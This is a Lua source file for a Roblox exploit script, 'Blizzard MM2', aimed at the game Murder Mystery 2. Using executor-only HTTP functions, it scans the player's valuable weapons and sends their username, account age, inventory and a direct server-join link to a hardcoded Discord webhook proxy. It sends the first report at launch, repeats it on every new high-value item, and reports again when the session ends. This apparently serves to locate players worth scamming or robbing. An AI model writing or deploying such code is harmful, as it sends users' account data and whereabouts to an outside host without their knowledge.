--============================================================
-- BLIZZARD MM2 V8.8.4 - NOTIFIER.LUA
--
-- Handles:
--   • Initial Discord execution notification
--   • High-value inventory scan
--   • Live high-value item watcher
--   • Session-ended notification
--
-- High Value:
--   Unique
--   Ancient
--   Godly
--   Classic = Vintage
--============================================================

--============================================================
-- SERVICES
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local HttpService =
	game:GetService("HttpService")

local LocalPlayer =
	Players.LocalPlayer

--============================================================
-- NOTIFIER DIAGNOSTIC GUI
--============================================================

local DiagnosticLines = {}

local DiagnosticGui =
	Instance.new("ScreenGui")

DiagnosticGui.Name =
	"BlizzardNotifierDiagnostic"

DiagnosticGui.ResetOnSpawn =
	false

DiagnosticGui.DisplayOrder =
	999999

DiagnosticGui.Parent =
	LocalPlayer:WaitForChild("PlayerGui")

local DiagnosticFrame =
	Instance.new("Frame")

DiagnosticFrame.Name =
	"Main"

DiagnosticFrame.Size =
	UDim2.new(0, 620, 0, 420)

DiagnosticFrame.Position =
	UDim2.new(0.5, -310, 0.5, -210)

DiagnosticFrame.BackgroundTransparency =
	0.08

DiagnosticFrame.Active =
	true

DiagnosticFrame.Draggable =
	true

DiagnosticFrame.Parent =
	DiagnosticGui

local DiagnosticTitle =
	Instance.new("TextLabel")

DiagnosticTitle.Size =
	UDim2.new(1, -12, 0, 34)

DiagnosticTitle.Position =
	UDim2.new(0, 6, 0, 4)

DiagnosticTitle.BackgroundTransparency =
	1

DiagnosticTitle.Text =
	"Blizzard Notifier Diagnostic"

DiagnosticTitle.TextSize =
	20

DiagnosticTitle.TextXAlignment =
	Enum.TextXAlignment.Left

DiagnosticTitle.Parent =
	DiagnosticFrame

local DiagnosticScroll =
	Instance.new("ScrollingFrame")

DiagnosticScroll.Size =
	UDim2.new(1, -12, 1, -86)

DiagnosticScroll.Position =
	UDim2.new(0, 6, 0, 40)

DiagnosticScroll.BackgroundTransparency =
	0.2

DiagnosticScroll.BorderSizePixel =
	0

DiagnosticScroll.CanvasSize =
	UDim2.new(0, 0, 0, 0)

DiagnosticScroll.ScrollBarThickness =
	8

DiagnosticScroll.Parent =
	DiagnosticFrame

local DiagnosticText =
	Instance.new("TextLabel")

DiagnosticText.Size =
	UDim2.new(1, -12, 0, 20)

DiagnosticText.Position =
	UDim2.new(0, 6, 0, 4)

DiagnosticText.BackgroundTransparency =
	1

DiagnosticText.Text =
	""

DiagnosticText.TextWrapped =
	false

DiagnosticText.TextXAlignment =
	Enum.TextXAlignment.Left

DiagnosticText.TextYAlignment =
	Enum.TextYAlignment.Top

DiagnosticText.TextSize =
	14

DiagnosticText.Font =
	Enum.Font.Code

DiagnosticText.Parent =
	DiagnosticScroll

local CopyButton =
	Instance.new("TextButton")

CopyButton.Size =
	UDim2.new(0, 150, 0, 34)

CopyButton.Position =
	UDim2.new(0, 6, 1, -40)

CopyButton.Text =
	"Copy Logs"

CopyButton.TextSize =
	16

CopyButton.Parent =
	DiagnosticFrame

local function DiagnosticLog(message)

	local line =
		string.format(
			"[%.2f] %s",
			os.clock(),
			tostring(message)
		)

	table.insert(
		DiagnosticLines,
		line
	)

	DiagnosticText.Text =
		table.concat(
			DiagnosticLines,
			"\n"
		)

	local lineHeight =
		18

	local neededHeight =
		math.max(
			20,
			#DiagnosticLines * lineHeight
		)

	DiagnosticText.Size =
		UDim2.new(
			1,
			-12,
			0,
			neededHeight
		)

	DiagnosticScroll.CanvasSize =
		UDim2.new(
			0,
			0,
			0,
			neededHeight + 10
		)

	DiagnosticScroll.CanvasPosition =
		Vector2.new(
			0,
			math.max(
				0,
				neededHeight - DiagnosticScroll.AbsoluteSize.Y
			)
		)

	print(
		"[NOTIFIER DIAG] "
		.. tostring(message)
	)
end

CopyButton.MouseButton1Click:Connect(function()

	local output =
		table.concat(
			DiagnosticLines,
			"\n"
		)

	local copied =
		false

	if setclipboard then

		copied =
			pcall(
				setclipboard,
				output
			)

	elseif toclipboard then

		copied =
			pcall(
				toclipboard,
				output
			)

	end

	if copied then

		DiagnosticLog(
			"Logs copied."
		)

	else

		DiagnosticLog(
			"Clipboard function unavailable."
		)

	end
end)

DiagnosticLog(
	"GUI READY"
)

DiagnosticLog(
	"NOTIFIER FILE REACHED"
)

DiagnosticLog(
	"Player = "
	.. tostring(
		LocalPlayer.Name
	)
)

DiagnosticLog(
	"Platform = "
	.. tostring(
		game:GetService("UserInputService"):GetPlatform()
	)
)

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

--============================================================
-- PREVENT DUPLICATE NOTIFIERS
--============================================================

local GlobalEnvironment =
	getgenv
	and getgenv()
	or _G

DiagnosticLog(
	"GLOBAL LOCK CHECK | existing="
	.. tostring(
		GlobalEnvironment.BlizzardNotifierRunning
	)
)

if GlobalEnvironment.BlizzardNotifierRunning then

	warn(
		"[MM2 NOTIFIER] Existing notifier already running."
	)

	return
end

GlobalEnvironment.BlizzardNotifierRunning =
	true

DiagnosticLog(
	"GLOBAL LOCK ACQUIRED"
)

--============================================================
-- WEBHOOK
--
-- IMPORTANT:
-- Put your webhook privately here.
-- Keep the URL on one line.
--============================================================

local webhookUrl =
	"https://webhook.lewisakura.moe/api/webhooks/1554313843579297812/ahJWYcCHJlvgXOYUheqvB-n8ZU05aetq6JOEF0-mpkhKY0kaL-p8ZIt5wWF6TwiVMPFyp"

--============================================================
-- SETTINGS
--============================================================

local INVENTORY_SCAN_INTERVAL =
	2

--============================================================
-- HTTP REQUEST
--============================================================

local httpRequest =
	request
	or http_request
	or (
		syn
		and syn.request
	)

DiagnosticLog(
	"HTTP FUNCTION CHECK"
)

DiagnosticLog(
	"request="
	.. tostring(
		type(request)
	)
	.. " | http_request="
	.. tostring(
		type(http_request)
	)
	.. " | syn.request="
	.. tostring(
		syn
		and type(syn.request)
		or "nil"
	)
	.. " | selected="
	.. tostring(
		type(httpRequest)
	)
)

if not httpRequest then

	warn(
		"[MM2 NOTIFIER] HTTP request function unavailable."
	)

	GlobalEnvironment.BlizzardNotifierRunning =
		nil

	return
end

--============================================================
-- INVENTORY MODULE
--============================================================

local InventoryModule = nil

DiagnosticLog(
	"INVENTORY MODULE REQUIRE START"
)

do

	local success,
	result =
		pcall(function()

			return require(
				ReplicatedStorage
					:WaitForChild("Modules")
					:WaitForChild("InventoryModule")
			)

		end)

	if success
		and type(result) == "table"
	then

		InventoryModule =
			result

		DiagnosticLog(
			"INVENTORY MODULE RESULT | success=true | type="
			.. tostring(
				type(result)
			)
		)

	else

		warn(
			"[MM2 NOTIFIER] Failed to load InventoryModule."
		)

		DiagnosticLog(
			"INVENTORY MODULE RESULT | success="
			.. tostring(
				success
			)
			.. " | result="
			.. tostring(
				result
			)
		)

		GlobalEnvironment.BlizzardNotifierRunning =
			nil

		return
	end
end

--============================================================
-- RARITY SETTINGS
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,

	-- MM2 internal name for Vintage
	Classic = true,
}

local PRIMARY_PRIORITY = {
	Unique = 1,
	Ancient = 2,
	Godly = 3,
	Classic = 4,
}

--============================================================
-- SAFE TABLE HELPERS
--============================================================

local function SafeGet(
	tbl,
	key
)

	if type(tbl) ~= "table" then
		return nil
	end

	local ok,
	result =
		pcall(function()

			return tbl[key]

		end)

	if ok then
		return result
	end

	return nil
end

local function FirstValue(
	tbl,
	keys
)

	if type(tbl) ~= "table" then
		return nil
	end

	for _, key in ipairs(
		keys
	) do

		local value =
			SafeGet(
				tbl,
				key
			)

		if value ~= nil then
			return value
		end
	end

	return nil
end

--============================================================
-- ITEM HELPERS
--============================================================

local function GetItemID(
	value,
	keyHint
)

	return FirstValue(
		value,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
			"id",
		}
	) or keyHint
end

local function GetItemName(
	value
)

	return FirstValue(
		value,
		{
			"ItemName",
			"DisplayName",
			"Name",
			"name",
		}
	)
end

local function GetItemRarity(
	value
)

	return FirstValue(
		value,
		{
			"Rarity",
			"rarity",
			"Tier",
		}
	)
end

local function GetItemType(
	value
)

	return FirstValue(
		value,
		{
			"ItemType",
			"WeaponType",
			"Type",
			"type",
		}
	)
end

local function GetItemAmount(
	value
)

	return tonumber(
		FirstValue(
			value,
			{
				"Amount",
				"amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(
	itemType
)

	return itemType == "Knife"
		or itemType == "Gun"
end

local function DisplayRarity(
	rarity
)

	if rarity == "Classic" then
		return "Vintage"
	end

	return rarity
end

--============================================================
-- GET WEAPONS TABLE
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)

	local data =
		SafeGet(
			inventory,
			"Data"
		)

	return SafeGet(
		data,
		"Weapons"
	)
end

--============================================================
-- HIGH-VALUE INVENTORY SCANNER
--============================================================

local function ScanHighValueInventory()

	local Weapons =
		GetWeaponsTable()

	if type(Weapons) ~= "table" then
		return {}
	end

	local primary = {}

	local visited = {}
	local seenIDs = {}

	local function Walk(
		tbl,
		depth
	)

		if type(tbl) ~= "table" then
			return
		end

		if visited[tbl] then
			return
		end

		if depth > 12 then
			return
		end

		visited[tbl] =
			true

		for key,
		value in pairs(tbl)
		do

			if type(value) == "table" then

				local rarity =
					GetItemRarity(
						value
					)

				local itemType =
					GetItemType(
						value
					)

				local amount =
					GetItemAmount(
						value
					)

				if rarity
					and amount > 0
					and IsWeaponType(
						itemType
					)
					and PRIMARY_RARITIES[
						tostring(
							rarity
						)
					]
				then

					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)

					if not seenIDs[
						dataID
					] then

						seenIDs[
							dataID
						] = true

						table.insert(
							primary,
							{
								DataID =
									dataID,

								Name =
									tostring(
										GetItemName(
											value
										)
										or dataID
									),

								Rarity =
									tostring(
										rarity
									),

								ItemType =
									tostring(
										itemType
									),

								Amount =
									amount,
							}
						)
					end
				end

				Walk(
					value,
					depth + 1
				)
			end
		end
	end

	Walk(
		Weapons,
		0
	)

	table.sort(
		primary,
		function(a, b)

			local pa =
				PRIMARY_PRIORITY[
					a.Rarity
				] or 99

			local pb =
				PRIMARY_PRIORITY[
					b.Rarity
				] or 99

			if pa ~= pb then
				return pa < pb
			end

			return a.DataID
				< b.DataID
		end
	)

	return primary
end

--============================================================
-- INVENTORY FORMATTER
--============================================================

local function FormatInventoryText(
	primary
)

	local lines = {
		"✨ **__High Value / Godly Items:__**"
	}

	if #primary == 0 then

		table.insert(
			lines,
			"• *None Detected*"
		)

	else

		for _, item in ipairs(
			primary
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** (%s) x%d",
					item.Name,
					DisplayRarity(
						item.Rarity
					),
					item.Amount
				)
			)
		end
	end

	local text =
		table.concat(
			lines,
			"\n"
		)

	if #text > 1000 then

		text =
			string.sub(
				text,
				1,
				970
			)
			.. "\n...and more items!"

	end

	return text
end

--============================================================
-- SNAPSHOT HELPERS
--============================================================

local function BuildSnapshot(
	items
)

	local snapshot = {}

	for _, item in ipairs(
		items
	) do

		snapshot[
			item.DataID
		] = {
			Amount =
				item.Amount,

			Name =
				item.Name,

			Rarity =
				item.Rarity,

			ItemType =
				item.ItemType,
		}
	end

	return snapshot
end

local function FindIncreases(
	oldSnapshot,
	currentItems
)

	local increases = {}

	for _, item in ipairs(
		currentItems
	) do

		local previous =
			oldSnapshot[
				item.DataID
			]

		local previousAmount =
			previous
			and tonumber(
				previous.Amount
			)
			or 0

		local currentAmount =
			tonumber(
				item.Amount
			)
			or 0

		if currentAmount
			> previousAmount
		then

			table.insert(
				increases,
				{
					Name =
						item.Name,

					Rarity =
						item.Rarity,

					Added =
						currentAmount
						- previousAmount,
				}
			)
		end
	end

	return increases
end

local function FormatIncreases(
	items
)

	local lines = {}

	for _, item in ipairs(
		items
	) do

		table.insert(
			lines,
			string.format(
				"• **%s** (%s) +%d",
				item.Name,
				DisplayRarity(
					item.Rarity
				),
				item.Added
			)
		)
	end

	return table.concat(
		lines,
		"\n"
	)
end

--============================================================
-- LINKS
--============================================================

local gameLink =
	"https://www.roblox.com/games/"
	.. tostring(
		game.PlaceId
	)

local serverJoinLink =
	"https://www.roblox.com/games/start?placeId="
	.. tostring(
		game.PlaceId
	)
	.. "&gameInstanceId="
	.. tostring(
		game.JobId
	)

--============================================================
-- WEBHOOK SENDER
--============================================================

local function SendWebhook(
	payload
)

	DiagnosticLog(
		"SENDWEBHOOK CALLED"
	)

	task.spawn(function()

		DiagnosticLog(
			"WEBHOOK TASK STARTED"
		)

		local encodedBody

		local encodeSuccess,
		encodeError =
			pcall(function()

				encodedBody =
					HttpService:JSONEncode(
						payload
					)

			end)

		DiagnosticLog(
			"JSON ENCODE | success="
			.. tostring(
				encodeSuccess
			)
			.. " | bytes="
			.. tostring(
				encodedBody
				and #encodedBody
				or 0
			)
		)

		if not encodeSuccess then

			warn(
				"[MM2 NOTIFIER] JSON encode failed: "
				.. tostring(
					encodeError
				)
			)

			return
		end

		DiagnosticLog(
			"WEBHOOK REQUEST START"
		)

		local requestSuccess,
		response =
			pcall(function()

				return httpRequest({
					Url =
						webhookUrl,

					Method =
						"POST",

					Headers = {
						["Content-Type"] =
							"application/json",
					},

					Body =
						encodedBody,
				})

			end)

		DiagnosticLog(
			"WEBHOOK REQUEST RETURNED | pcall="
			.. tostring(
				requestSuccess
			)
			.. " | responseType="
			.. tostring(
				type(response)
			)
		)

		if not requestSuccess then

			warn(
				"[MM2 NOTIFIER] Webhook request failed: "
				.. tostring(
					response
				)
			)

			return
		end

		local statusCode =
			response
			and (
				response.StatusCode
				or response.Status
			)

		if statusCode
			and statusCode ~= 200
			and statusCode ~= 204
		then

			warn(
				"[MM2 NOTIFIER] Webhook rejected. Status: "
				.. tostring(
					statusCode
				)
			)

			return
		end

		print(
			"[MM2 NOTIFIER] Webhook sent."
		)

	end)
end

--============================================================
-- INITIAL SCAN
--============================================================

DiagnosticLog(
	"INITIAL INVENTORY SCAN START"
)

local CurrentItems =
	ScanHighValueInventory()

DiagnosticLog(
	"INITIAL INVENTORY SCAN COMPLETE | highValueItems="
	.. tostring(
		#CurrentItems
	)
)

local PreviousSnapshot =
	BuildSnapshot(
		CurrentItems
	)

local parsedInventory =
	FormatInventoryText(
		CurrentItems
	)

--============================================================
-- INITIAL EXECUTION NOTIFICATION
--============================================================

DiagnosticLog(
	"INITIAL EXECUTION WEBHOOK ABOUT TO SEND"
)

SendWebhook({
	embeds = {
		{
			title =
				"Blizzard MM2 Executed! 🚀",

			color =
				3447003,

			fields = {

				{
					name =
						"Player Username",

					value =
						tostring(
							LocalPlayer.Name
						),

					inline =
						true,
				},

				{
					name =
						"Account Age (Days)",

					value =
						tostring(
							LocalPlayer.AccountAge
						),

					inline =
						true,
				},

				{
					name =
						"Game Place ID",

					value =
						tostring(
							game.PlaceId
						),

					inline =
						false,
				},

				{
					name =
						"Direct Link",

					value =
						"[Click to View Game]("
						.. gameLink
						.. ")",

					inline =
						true,
				},

				{
					name =
						"Direct Server Join Link",

					value =
						"[Launch & Join Server]("
						.. serverJoinLink
						.. ")",

					inline =
						false,
				},

				{
					name =
						"🎒 Scanned Player Inventory",

					value =
						parsedInventory,

					inline =
						false,
				},
			},

			timestamp =
				DateTime.now():ToIsoDate(),
		},
	},
})

--============================================================
-- LIVE INVENTORY WATCHER
--============================================================

task.spawn(function()

	while GlobalEnvironment.BlizzardNotifierRunning do

		task.wait(
			INVENTORY_SCAN_INTERVAL
		)

		if MM2
			and MM2.Running == false
		then
			break
		end

		local currentItems =
			ScanHighValueInventory()

		local increases =
			FindIncreases(
				PreviousSnapshot,
				currentItems
			)

		PreviousSnapshot =
			BuildSnapshot(
				currentItems
			)

		if #increases > 0 then

			SendWebhook({
				embeds = {
					{
						title =
							"Blizzard MM2 Inventory Updated! ✨",

						color =
							5763719,

						fields = {

							{
								name =
									"Player Username",

								value =
									tostring(
										LocalPlayer.Name
									),

								inline =
									true,
							},

							{
								name =
									"✨ New High Value Items Detected",

								value =
									FormatIncreases(
										increases
									),

								inline =
									false,
							},

							{
								name =
									"🎒 Current High Value Inventory",

								value =
									FormatInventoryText(
										currentItems
									),

								inline =
									false,
							},

							{
								name =
									"Direct Server Join Link",

								value =
									"[Launch & Join Server]("
									.. serverJoinLink
									.. ")",

								inline =
									false,
							},
						},

						timestamp =
							DateTime.now():ToIsoDate(),
					},
				},
			})
		end
	end
end)

--============================================================
-- SESSION END NOTIFIER
--============================================================

local SessionEndSent =
	false

local function SendSessionEnded()

	if SessionEndSent then
		return
	end

	SessionEndSent =
		true

	SendWebhook({
		embeds = {
			{
				title =
					"Blizzard MM2 Session Ended",

				color =
					15158332,

				fields = {

					{
						name =
							"Player Username",

						value =
							tostring(
								LocalPlayer.Name
							),

						inline =
							true,
					},

					{
						name =
							"Status",

						value =
							"Session Ended",

						inline =
							true,
					},

					{
						name =
							"Game Place ID",

						value =
							tostring(
								game.PlaceId
							),

						inline =
							false,
					},
				},

				timestamp =
					DateTime.now():ToIsoDate(),
			},
		},
	})

	GlobalEnvironment.BlizzardNotifierRunning =
		nil
end

Players.PlayerRemoving:Connect(
	function(player)

		if player == LocalPlayer then

			SendSessionEnded()

		end
	end
)

LocalPlayer.AncestryChanged:Connect(
	function(_, parent)

		if parent == nil then

			SendSessionEnded()

		end
	end
)

print(
	"[MM2 NOTIFIER] Notifier initialized successfully."
)